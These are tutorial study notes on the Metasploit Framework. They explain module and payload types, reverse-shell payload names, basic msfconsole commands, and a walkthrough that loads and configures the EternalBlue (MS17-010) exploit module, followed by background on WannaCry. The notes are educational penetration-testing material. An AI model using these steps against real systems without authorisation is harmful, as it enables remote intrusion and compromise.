# 1. Metasploit Framework

### Key Terms

* **Exploit** → Code that takes advantage of a vulnerability.
* **Vulnerability** → Weakness or flaw in a system that can be exploited.
* **Payload** → Code executed on the target after successful exploitation (e.g., shell, command execution).

---

# Metasploit Modules

## 1. Auxiliary

* Used for **scanning, enumeration, fuzzing, crawling**.
* **Does NOT exploit** vulnerabilities.

**Examples:** Scanner, Crawler, Fuzzer

---

## 2. Encoders

* Encode **payloads/exploits**.
* Helps bypass **signature-based antivirus** (limited success).

---

## 3. Evasion

* Attempts to **bypass antivirus/security software**.

---

## 4. Exploits

* Modules that **exploit vulnerabilities** in target systems.

**Examples:** Windows, Linux, Android, Unix exploits.

---

## 5. NOPs (No Operation)

* CPU performs **no action** for one cycle.
* Used as **buffers** to maintain payload size and reliability.

---

## 6. Payloads

* Code executed **after successful exploitation**.

**Examples:**

* Open a shell
* Run a command
* Add a user
* Launch `calc.exe`
* Install malware/backdoor

### Types of Payloads

#### ➡️Adapters

* Convert payloads into different formats.
* Example: Wrap payload into a **PowerShell** command.

#### ➡️Singles (Inline Payloads)

* Self-contained payloads.
* No additional download required.

**Examples:** Add user, launch Notepad.

#### ➡️Stagers

* Establish connection between **Metasploit ↔ Target**.
* Downloads the actual payload (**Stage**).

#### ➡️Stages

* Main payload downloaded by the stager.
* Allows larger payloads.

---

## Single vs Staged Payload

### ➡️Single (Inline) Payload

```text
generic/shell_reverse_tcp
```

* Uses **_ (underscore)**
* Entire payload sent at once.

### ➡️Staged Payload

```text
windows/x64/shell/reverse_tcp
```

* Uses **/ (slash)**
* Sends **Stager first → then downloads Stage**.

> **Memory Trick:**
> **`_` = Single Payload**
> **`/` = Staged Payload**

---

## 7. Post Modules

* Used **after gaining access** to the target.
* Helps in **post-exploitation** activities.

**Examples:**

* Credential dumping
* Privilege escalation
* System enumeration
* Data collection

# 2.🖥️ Metasploit Console (`msfconsole`)

**`msfconsole`** is the main interface used to work with the **Metasploit Framework**.

```bash
msfconsole
```

---

# 📌 Basic Commands

| Command          | Purpose                       |
| ---------------- | ----------------------------- |
| `help`           | Show all commands             |
| `help <command>` | Help for a specific command   |
| `history`        | Show previously used commands |
| `clear`          | Clear terminal                |
| `version`        | Show Metasploit version       |
| `exit`           | Exit Metasploit               |

---

# 🔍 Search Modules

Search modules by keyword.

```bash
search apache
search ms17-010
search telnet
```

### Search Filters

```bash
search type:auxiliary telnet
search type:exploit apache
search platform:windows smb
```

---

# 📂 Use a Module

Load a module.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

or using search result number

```bash
use 2
```

---

# ⚙️ Show Module Options

Displays required parameters.

```bash
show options
```

Common options:

* `RHOSTS` → Target IP
* `RPORT` → Target Port
* `LHOST` → Your IP
* `LPORT` → Listening Port

---

# ✏️ Set Values

```bash
set RHOSTS 10.10.10.5
set RPORT 445
set LHOST 10.10.10.20
```

---

# 📦 Show Payloads

Shows compatible payloads.

```bash
show payloads
```

---

# ℹ️ Module Information

Shows author, description, references, targets, options, etc.

```bash
info
```

or

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

---

# 🔙 Go Back

Exit current module.

```bash
back
```

---

# ▶️ Run Module

Start the exploit/scanner.

```bash
run
```

or

```bash
exploit
```

---

# 🧠 Module Context

When you load a module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Prompt changes from

```text
msf6 >
```

to

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

➡️ You are now inside that module.

**Note:** Settings like `RHOSTS` and `RPORT` are **module-specific**. If you switch to another module, you'll need to set them again.

# 💥 EternalBlue (MS17-010)

**EternalBlue** is an **SMBv1 (Server Message Block v1)** vulnerability discovered by the **U.S. National Security Agency (NSA)**.

* 📅 **Disclosed:** 2017
* 🎯 **Target:** Microsoft Windows systems
* 🔓 **Port Used:** **445 (SMB)**
* ⚠️ **Impact:** Allows **Remote Code Execution (RCE)** on vulnerable Windows machines.

### 🛠️ Why is it dangerous?

An attacker can execute malicious code on the victim's computer **without physical access**, simply by exploiting the SMB vulnerability.

---

# 🦠 WannaCry Ransomware

**WannaCry** is a **ransomware attack** that spread worldwide in **May 2017** using the **EternalBlue exploit**.

### What it did:

* 🔒 Encrypted users' files
* 💰 Demanded ransom payment in Bitcoin
* 🌍 Infected **200,000+ computers** across **150+ countries**

### Attack Flow

```text
EternalBlue Vulnerability (MS17-010)
            ↓
   Exploits SMBv1 (Port 445)
            ↓
 Gains Remote Code Execution
            ↓
    WannaCry Executes
            ↓
 Encrypts Files & Demands Ransom
```
